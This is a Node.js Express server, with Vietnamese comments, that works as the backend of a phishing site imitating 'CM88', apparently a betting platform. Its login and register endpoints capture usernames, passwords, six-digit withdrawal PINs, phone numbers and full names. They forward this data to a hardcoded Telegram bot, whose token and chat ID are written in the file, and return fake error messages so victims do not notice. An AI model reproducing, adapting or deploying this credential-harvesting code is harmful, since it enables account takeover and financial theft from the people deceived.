const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Thay Token Bot và Chat ID Telegram của bạn vào đây
const TELEGRAM_BOT_TOKEN = '8614162784:AAGCjoPhDogqD3hKmnK5pTgnInGNrZYg3Rg';
const TELEGRAM_CHAT_ID = '-5121626811';

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

async function sendTelegram(message) {
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (e) {
        console.log('Lỗi gửi Telegram:', e.message);
    }
}

// Bắt dữ liệu đăng nhập + Mã PIN rút tiền 6 số
app.post('/api/login', async (req, res) => {
    const { username, password, pin } = req.body;
    const info = `🚨 <b>[LOGIN CM88 + PIN]</b>\n👤 Tài khoản: <code>${username}</code>\n🔑 Mật khẩu: <code>${password}</code>\n💰 Mã rút tiền: <code>${pin}</code>`;
    
    console.log(info);
    await sendTelegram(info);

    res.json({ status: 'error', message: 'Tài khoản không chính xác' });
});
// Bắt dữ liệu đăng ký
app.post('/api/register', async (req, res) => {
    const { username, password, phone, fullname } = req.body;
    const info = `🎁 <b>[REGISTER CM88]</b>\n👤 Tài khoản: <code>${username}</code>\n🔑 Mật khẩu: <code>${password}</code>\n📞 SĐT: <code>${phone}</code>\n📝 Họ tên: <code>${fullname}</code>`;
    
    console.log(info);
    await sendTelegram(info);

    res.json({ status: 'error', message: 'Đăng ký thất bại' });
});

app.listen(PORT, () => {
    console.log(`Server đang chạy tại http://localhost:${PORT}`);
});